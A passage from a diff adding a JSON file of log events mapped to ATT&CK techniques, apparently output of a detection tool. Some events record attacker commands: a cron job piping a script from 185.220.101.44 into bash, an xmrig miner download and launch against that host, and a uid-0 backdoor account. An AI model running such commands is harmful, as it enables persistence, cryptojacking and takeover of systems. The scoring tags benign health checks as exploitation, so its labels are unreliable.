+          "name": "Disable or Modify Tools",
+          "confidence": "low",
+          "score": 0.04932063289472724,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1547.001",
+          "name": "Registry Run Keys / Startup Folder",
+          "confidence": "low",
+          "score": 0.04790464452580346,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1021.004",
+          "name": "SSH",
+          "confidence": "low",
+          "score": 0.04538700681586444,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1053.005",
+          "name": "Scheduled Task",
+          "confidence": "low",
+          "score": 0.04211497516060528,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1070.003",
+          "name": "Clear Command History",
+          "confidence": "low",
+          "score": 0.037439702803420134,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1190",
+          "name": "Exploit Public-Facing Application",
+          "confidence": "low",
+          "score": 0.03664411421588561,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1078",
+          "name": "Valid Accounts",
+          "confidence": "low",
+          "score": 0.03439683712652736,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1110.004",
+          "name": "Credential Stuffing",
+          "confidence": "low",
+          "score": 0.033047009875466174,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1140",
+          "name": "Deobfuscate/Decode Files or Information",
+          "confidence": "low",
+          "score": 0.032558388381871084,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1021",
+          "name": "Remote Services",
+          "confidence": "low",
+          "score": 0.03065297035994392,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1572",
+          "name": "Protocol Tunneling",
+          "confidence": "low",
+          "score": 0.030433140667676613,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1056.001",
+          "name": "Keylogging",
+          "confidence": "low",
+          "score": 0.029373115437418874,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1136.001",
+          "name": "Local Account",
+          "confidence": "low",
+          "score": 0.025386831414976396,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1113",
+          "name": "Screen Capture",
+          "confidence": "low",
+          "score": 0.02434294549156126,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        }
+      ],
+      "primary_technique": "T1098.004",
+      "primary_confidence": "high",
+      "channel": "auditd",
+      "event_id": "execve"
+    },
+    {
+      "index": 13,
+      "ts": "2026-10-06T10:08:00",
+      "host": "gw-check",
+      "user": "checker",
+      "process": "",
+      "parent_process": "",
+      "command_line": "GET /health HTTP/1.1 200",
+      "command_line_full": "GET /health HTTP/1.1 200",
+      "message": "GET /health HTTP/1.1 200",
+      "raw": {
+        "@timestamp": "2026-10-06T10:08:00Z",
+        "host.name": "gw-check",
+        "user.name": "checker",
+        "winlog.channel": "nginx",
+        "event.code": "access",
+        "process.name": "",
+        "process.parent.name": "",
+        "process.command_line": "",
+        "source.ip": "172.16.9.9",
+        "destination.ip": "10.20.0.10",
+        "message": "GET /health HTTP/1.1 200"
+      },
+      "techniques": [
+        {
+          "technique": "T1190",
+          "name": "Exploit Public-Facing Application",
+          "confidence": "medium",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1112",
+          "name": "Modify Registry",
+          "confidence": "medium",
+          "score": 0.9970059965168873,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1059.001",
+          "name": "PowerShell",
+          "confidence": "medium",
+          "score": 0.7315900231926635,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1685",
+          "name": "Disable or Modify Tools",
+          "confidence": "medium",
+          "score": 0.5088509093256618,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1574.001",
+          "name": "DLL",
+          "confidence": "medium",
+          "score": 0.49930759167481054,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1218",
+          "name": "System Binary Proxy Execution",
+          "confidence": "medium",
+          "score": 0.48586605523874615,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1105",
+          "name": "Ingress Tool Transfer",
+          "confidence": "low",
+          "score": 0.4199735168616212,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1003.001",
+          "name": "LSASS Memory",
+          "confidence": "low",
+          "score": 0.40250671412258304,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1027",
+          "name": "Obfuscated Files or Information",
+          "confidence": "low",
+          "score": 0.33061268777263253,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1204.002",
+          "name": "Malicious File",
+          "confidence": "low",
+          "score": 0.29886723264306864,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1082",
+          "name": "System Information Discovery",
+          "confidence": "low",
+          "score": 0.28513822935430655,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059",
+          "name": "Command and Scripting Interpreter",
+          "confidence": "low",
+          "score": 0.25812315845455347,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1047",
+          "name": "Windows Management Instrumentation",
+          "confidence": "low",
+          "score": 0.21667298449350836,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1071.001",
+          "name": "Web Protocols",
+          "confidence": "low",
+          "score": 0.2139518318444719,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1218.011",
+          "name": "Rundll32",
+          "confidence": "low",
+          "score": 0.1811038962632405,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.003",
+          "name": "Windows Command Shell",
+          "confidence": "low",
+          "score": 0.17205875472421592,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1219.002",
+          "name": "Remote Desktop Software",
+          "confidence": "low",
+          "score": 0.1717314775653531,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1003",
+          "name": "OS Credential Dumping",
+          "confidence": "low",
+          "score": 0.1713822925903646,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1547.001",
+          "name": "Registry Run Keys / Startup Folder",
+          "confidence": "low",
+          "score": 0.1693847390106606,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1543.003",
+          "name": "Windows Service",
+          "confidence": "low",
+          "score": 0.1684818962673701,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        }
+      ],
+      "primary_technique": "T1190",
+      "primary_confidence": "medium",
+      "channel": "nginx",
+      "event_id": "access"
+    },
+    {
+      "index": 14,
+      "ts": "2026-10-06T10:09:05",
+      "host": "web01",
+      "user": "root",
+      "process": "crontab",
+      "parent_process": "bash",
+      "command_line": "crontab -l ; echo '* * * * * curl -s http://185.220.101.44/x.sh | bash' | crontab -",
+      "command_line_full": "crontab -l ; echo '* * * * * curl -s http://185.220.101.44/x.sh | bash' | crontab -",
+      "message": "cron persistence",
+      "raw": {
+        "@timestamp": "2026-10-06T10:09:05Z",
+        "host.name": "web01",
+        "user.name": "root",
+        "winlog.channel": "auditd",
+        "event.code": "execve",
+        "process.name": "crontab",
+        "process.parent.name": "bash",
+        "process.command_line": "crontab -l ; echo '* * * * * curl -s http://185.220.101.44/x.sh | bash' | crontab -",
+        "source.ip": "",
+        "destination.ip": "",
+        "message": "cron persistence"
+      },
+      "techniques": [
+        {
+          "technique": "T1059.004",
+          "name": "Unix Shell",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: crontab -l ; echo '* * * * * curl -s http://185.22..."
+        },
+        {
+          "technique": "T1105",
+          "name": "Ingress Tool Transfer",
+          "confidence": "high",
+          "score": 0.9913194295300194,
+          "source": "heuristic",
+          "evidence": "KB search match on: crontab -l ; echo '* * * * * curl -s http://185.22..."
+        },
+        {
+          "technique": "T1053.003",
+          "name": "Cron",
+          "confidence": "high",
+          "score": 0.9354482452914482,
+          "source": "heuristic",
+          "evidence": "KB search match on: crontab -l ; echo '* * * * * curl -s http://185.22..."
+        },
+        {
+          "technique": "T1140",
+          "name": "Deobfuscate/Decode Files or Information",
+          "confidence": "low",
+          "score": 0.04793894250001294,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059",
+          "name": "Command and Scripting Interpreter",
+          "confidence": "low",
+          "score": 0.044305285549510354,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1190",
+          "name": "Exploit Public-Facing Application",
+          "confidence": "low",
+          "score": 0.04378793947264565,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1053.005",
+          "name": "Scheduled Task",
+          "confidence": "low",
+          "score": 0.04056180754410683,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1070.003",
+          "name": "Clear Command History",
+          "confidence": "low",
+          "score": 0.03953339955732973,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1112",
+          "name": "Modify Registry",
+          "confidence": "low",
+          "score": 0.03628873481359849,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1546.005",
+          "name": "Trap",
+          "confidence": "low",
+          "score": 0.032486327234823115,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1195.002",
+          "name": "Compromise Software Supply Chain",
+          "confidence": "low",
+          "score": 0.03025804633046475,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.001",
+          "name": "PowerShell",
+          "confidence": "low",
+          "score": 0.028835727378034838,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1056.001",
+          "name": "Keylogging",
+          "confidence": "low",
+          "score": 0.028314177039694795,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1218",
+          "name": "System Binary Proxy Execution",
+          "confidence": "low",
+          "score": 0.026274652459050564,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1071.001",
+          "name": "Web Protocols",
+          "confidence": "low",
+          "score": 0.025647850858434434,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1553.004",
+          "name": "Install Root Certificate",
+          "confidence": "low",
+          "score": 0.02548374523864843,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1110.001",
+          "name": "Password Guessing",
+          "confidence": "low",
+          "score": 0.02490227428185616,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1548.001",
+          "name": "Setuid and Setgid",
+          "confidence": "low",
+          "score": 0.021234380397868208,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1543.002",
+          "name": "Systemd Service",
+          "confidence": "low",
+          "score": 0.020605737203610974,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1685",
+          "name": "Disable or Modify Tools",
+          "confidence": "low",
+          "score": 0.019852475579461886,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        }
+      ],
+      "primary_technique": "T1059.004",
+      "primary_confidence": "high",
+      "channel": "auditd",
+      "event_id": "execve"
+    },
+    {
+      "index": 15,
+      "ts": "2026-10-06T10:11:30",
+      "host": "web01",
+      "user": "root",
+      "process": "curl",
+      "parent_process": "bash",
+      "command_line": "curl -O http://185.220.101.44/xmrig",
+      "command_line_full": "curl -O http://185.220.101.44/xmrig",
+      "message": "download tool",
+      "raw": {
+        "@timestamp": "2026-10-06T10:11:30Z",
+        "host.name": "web01",
+        "user.name": "root",
+        "winlog.channel": "auditd",
+        "event.code": "execve",
+        "process.name": "curl",
+        "process.parent.name": "bash",
+        "process.command_line": "curl -O http://185.220.101.44/xmrig",
+        "source.ip": "",
+        "destination.ip": "",
+        "message": "download tool"
+      },
+      "techniques": [
+        {
+          "technique": "T1105",
+          "name": "Ingress Tool Transfer",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: curl -O http://185.220.101.44/xmrig"
+        },
+        {
+          "technique": "T1496",
+          "name": "Resource Hijacking",
+          "confidence": "high",
+          "score": 0.9903399772247871,
+          "source": "heuristic",
+          "evidence": "KB search match on: curl -O http://185.220.101.44/xmrig"
+        },
+        {
+          "technique": "T1059.001",
+          "name": "PowerShell",
+          "confidence": "low",
+          "score": 0.05723782532988333,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.004",
+          "name": "Unix Shell",
+          "confidence": "low",
+          "score": 0.05419937601212868,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1218",
+          "name": "System Binary Proxy Execution",
+          "confidence": "low",
+          "score": 0.05380375618650189,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1190",
+          "name": "Exploit Public-Facing Application",
+          "confidence": "low",
+          "score": 0.0426187513806442,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059",
+          "name": "Command and Scripting Interpreter",
+          "confidence": "low",
+          "score": 0.03602282803172522,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1071.001",
+          "name": "Web Protocols",
+          "confidence": "low",
+          "score": 0.028748593451377133,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1195.002",
+          "name": "Compromise Software Supply Chain",
+          "confidence": "low",
+          "score": 0.028241212508030064,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1553.004",
+          "name": "Install Root Certificate",
+          "confidence": "low",
+          "score": 0.023712188980043604,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1027",
+          "name": "Obfuscated Files or Information",
+          "confidence": "low",
+          "score": 0.02212868718919947,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1110.001",
+          "name": "Password Guessing",
+          "confidence": "low",
+          "score": 0.021477318021371154,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1070.003",
+          "name": "Clear Command History",
+          "confidence": "low",
+          "score": 0.01973273989730366,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1685",
+          "name": "Disable or Modify Tools",
+          "confidence": "low",
+          "score": 0.01945495368503606,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1219.002",
+          "name": "Remote Desktop Software",
+          "confidence": "low",
+          "score": 0.017696931571383714,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1197",
+          "name": "BITS Jobs",
+          "confidence": "low",
+          "score": 0.01757825413445353,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1113",
+          "name": "Screen Capture",
+          "confidence": "low",
+          "score": 0.016829846580133163,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1003.001",
+          "name": "LSASS Memory",
+          "confidence": "low",
+          "score": 0.01603057009551623,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.003",
+          "name": "Windows Command Shell",
+          "confidence": "low",
+          "score": 0.015903240679888495,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1548.001",
+          "name": "Setuid and Setgid",
+          "confidence": "low",
+          "score": 0.015358510963254532,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        }
+      ],
+      "primary_technique": "T1105",
+      "primary_confidence": "high",
+      "channel": "auditd",
+      "event_id": "execve"
+    },
+    {
+      "index": 16,
+      "ts": "2026-10-06T10:12:10",
+      "host": "web01",
+      "user": "root",
+      "process": "xmrig",
+      "parent_process": "bash",
+      "command_line": "/tmp/.x/xmrig -o stratum+tcp://185.220.101.44:3333 -u wallet --donate-level 0",
+      "command_line_full": "/tmp/.x/xmrig -o stratum+tcp://185.220.101.44:3333 -u wallet --donate-level 0",
+      "message": "cryptominer",
+      "raw": {
+        "@timestamp": "2026-10-06T10:12:10Z",
+        "host.name": "web01",
+        "user.name": "root",
+        "winlog.channel": "auditd",
+        "event.code": "execve",
+        "process.name": "xmrig",
+        "process.parent.name": "bash",
+        "process.command_line": "/tmp/.x/xmrig -o stratum+tcp://185.220.101.44:3333 -u wallet --donate-level 0",
+        "source.ip": "",
+        "destination.ip": "",
+        "message": "cryptominer"
+      },
+      "techniques": [
+        {
+          "technique": "T1496",
+          "name": "Resource Hijacking",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: /tmp/.x/xmrig -o stratum+tcp://185.220.101.44:3333..."
+        },
+        {
+          "technique": "T1685",
+          "name": "Disable or Modify Tools",
+          "confidence": "medium",
+          "score": 0.06757708201895182,
+          "source": "heuristic",
+          "evidence": "KB search match on: /tmp/.x/xmrig -o stratum+tcp://185.220.101.44:3333..."
+        },
+        {
+          "technique": "T1059.004",
+          "name": "Unix Shell",
+          "confidence": "low",
+          "score": 0.0609482591311989,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1112",
+          "name": "Modify Registry",
+          "confidence": "low",
+          "score": 0.04973184889091736,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.001",
+          "name": "PowerShell",
+          "confidence": "low",
+          "score": 0.046955085769022326,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1027",
+          "name": "Obfuscated Files or Information",
+          "confidence": "low",
+          "score": 0.03735701288283785,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1548.001",
+          "name": "Setuid and Setgid",
+          "confidence": "low",
+          "score": 0.03257716313697622,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1113",
+          "name": "Screen Capture",
+          "confidence": "low",
+          "score": 0.027805954888595785,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1553.004",
+          "name": "Install Root Certificate",
+          "confidence": "low",
+          "score": 0.027367459219680167,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1070.003",
+          "name": "Clear Command History",
+          "confidence": "low",
+          "score": 0.027330417728585042,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1686",
+          "name": "Disable or Modify System Firewall",
+          "confidence": "low",
+          "score": 0.02531310967335362,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1190",
+          "name": "Exploit Public-Facing Application",
+          "confidence": "low",
+          "score": 0.024987930758407727,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1105",
+          "name": "Ingress Tool Transfer",
+          "confidence": "low",
+          "score": 0.020938958341175186,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1071.001",
+          "name": "Web Protocols",
+          "confidence": "low",
+          "score": 0.019283297187199525,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059",
+          "name": "Command and Scripting Interpreter",
+          "confidence": "low",
+          "score": 0.0185530632059191,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1082",
+          "name": "System Information Discovery",
+          "confidence": "low",
+          "score": 0.016619858762577246,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1560.001",
+          "name": "Archive via Utility",
+          "confidence": "low",
+          "score": 0.016207121143731996,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1195.002",
+          "name": "Compromise Software Supply Chain",
+          "confidence": "low",
+          "score": 0.015477251781574072,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1543.003",
+          "name": "Windows Service",
+          "confidence": "low",
+          "score": 0.014833189319971985,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1218",
+          "name": "System Binary Proxy Execution",
+          "confidence": "low",
+          "score": 0.014599701798593252,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        }
+      ],
+      "primary_technique": "T1496",
+      "primary_confidence": "high",
+      "channel": "auditd",
+      "event_id": "execve"
+    },
+    {
+      "index": 17,
+      "ts": "2026-10-06T10:13:00",
+      "host": "gw-check",
+      "user": "checker",
+      "process": "",
+      "parent_process": "",
+      "command_line": "GET /health HTTP/1.1 200",
+      "command_line_full": "GET /health HTTP/1.1 200",
+      "message": "GET /health HTTP/1.1 200",
+      "raw": {
+        "@timestamp": "2026-10-06T10:13:00Z",
+        "host.name": "gw-check",
+        "user.name": "checker",
+        "winlog.channel": "nginx",
+        "event.code": "access",
+        "process.name": "",
+        "process.parent.name": "",
+        "process.command_line": "",
+        "source.ip": "172.16.9.9",
+        "destination.ip": "10.20.0.10",
+        "message": "GET /health HTTP/1.1 200"
+      },
+      "techniques": [
+        {
+          "technique": "T1190",
+          "name": "Exploit Public-Facing Application",
+          "confidence": "medium",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1112",
+          "name": "Modify Registry",
+          "confidence": "medium",
+          "score": 0.9970059965168873,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1059.001",
+          "name": "PowerShell",
+          "confidence": "medium",
+          "score": 0.7315900231926635,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1685",
+          "name": "Disable or Modify Tools",
+          "confidence": "medium",
+          "score": 0.5088509093256618,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1574.001",
+          "name": "DLL",
+          "confidence": "medium",
+          "score": 0.49930759167481054,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1218",
+          "name": "System Binary Proxy Execution",
+          "confidence": "medium",
+          "score": 0.48586605523874615,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1105",
+          "name": "Ingress Tool Transfer",
+          "confidence": "low",
+          "score": 0.4065904661493906,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1003.001",
+          "name": "LSASS Memory",
+          "confidence": "low",
+          "score": 0.38968026780908666,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1027",
+          "name": "Obfuscated Files or Information",
+          "confidence": "low",
+          "score": 0.32007724639615664,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1204.002",
+          "name": "Malicious File",
+          "confidence": "low",
+          "score": 0.2974464111867044,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1082",
+          "name": "System Information Discovery",
+          "confidence": "low",
+          "score": 0.276051895977953,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059",
+          "name": "Command and Scripting Interpreter",
+          "confidence": "low",
+          "score": 0.24989769856028912,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1047",
+          "name": "Windows Management Instrumentation",
+          "confidence": "low",
+          "score": 0.20976839307756337,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1071.001",
+          "name": "Web Protocols",
+          "confidence": "low",
+          "score": 0.20713395381028943,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1218.011",
+          "name": "Rundll32",
+          "confidence": "low",
+          "score": 0.17533276420237745,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.003",
+          "name": "Windows Command Shell",
+          "confidence": "low",
+          "score": 0.16657585890458226,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1219.002",
+          "name": "Remote Desktop Software",
+          "confidence": "low",
+          "score": 0.16625901089574474,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1003",
+          "name": "OS Credential Dumping",
+          "confidence": "low",
+          "score": 0.16592095319435948,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1547.001",
+          "name": "Registry Run Keys / Startup Folder",
+          "confidence": "low",
+          "score": 0.163987054487604,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1543.003",
+          "name": "Windows Service",
+          "confidence": "low",
+          "score": 0.1631129821065709,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        }
+      ],
+      "primary_technique": "T1190",
+      "primary_confidence": "medium",
+      "channel": "nginx",
+      "event_id": "access"
+    },
+    {
+      "index": 18,
+      "ts": "2026-10-06T10:14:00",
+      "host": "web01",
+      "user": "root",
+      "process": "useradd",
+      "parent_process": "bash",
+      "command_line": "useradd -o -u 0 -g 0 -M support",
+      "command_line_full": "useradd -o -u 0 -g 0 -M support",
+      "message": "backdoor uid0 user",
+      "raw": {
+        "@timestamp": "2026-10-06T10:14:00Z",
+        "host.name": "web01",
+        "user.name": "root",
+        "winlog.channel": "auditd",
+        "event.code": "execve",
+        "process.name": "useradd",
+        "process.parent.name": "bash",
+        "process.command_line": "useradd -o -u 0 -g 0 -M support",
+        "source.ip": "",
+        "destination.ip": "",
+        "message": "backdoor uid0 user"
+      },
+      "techniques": [
+        {
+          "technique": "T1136.001",
+          "name": "Local Account",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: useradd -o -u 0 -g 0 -M support"
+        },
+        {
+          "technique": "T1685",
+          "name": "Disable or Modify Tools",
+          "confidence": "medium",
+          "score": 0.12547979549760283,
+          "source": "heuristic",
+          "evidence": "KB search match on: useradd -o -u 0 -g 0 -M support"
+        },
+        {
+          "technique": "T1112",
+          "name": "Modify Registry",
+          "confidence": "medium",
+          "score": 0.08088758335214916,
+          "source": "heuristic",
+          "evidence": "KB search match on: useradd -o -u 0 -g 0 -M support"
+        },
+        {
+          "technique": "T1059.001",
+          "name": "PowerShell",
+          "confidence": "low",
+          "score": 0.06135891556163363,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.004",
+          "name": "Unix Shell",
+          "confidence": "low",
+          "score": 0.05490182857242389,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1078.003",
+          "name": "Local Accounts",
+          "confidence": "low",
+          "score": 0.04713933576558063,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1027",
+          "name": "Obfuscated Files or Information",
+          "confidence": "low",
+          "score": 0.046963798459400935,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1548.001",
+          "name": "Setuid and Setgid",
+          "confidence": "low",
+          "score": 0.04317290695505596,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1098",
+          "name": "Account Manipulation",
+          "confidence": "low",
+          "score": 0.03398857453505627,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1070.003",
+          "name": "Clear Command History",
+          "confidence": "low",
+          "score": 0.0325559972872719,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1110.001",
+          "name": "Password Guessing",
+          "confidence": "low",
+          "score": 0.02991498053361937,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1113",
+          "name": "Screen Capture",
+          "confidence": "low",
+          "score": 0.02921701870194804,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1553.004",
+          "name": "Install Root Certificate",
+          "confidence": "low",
+          "score": 0.027492829928470516,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1219.002",
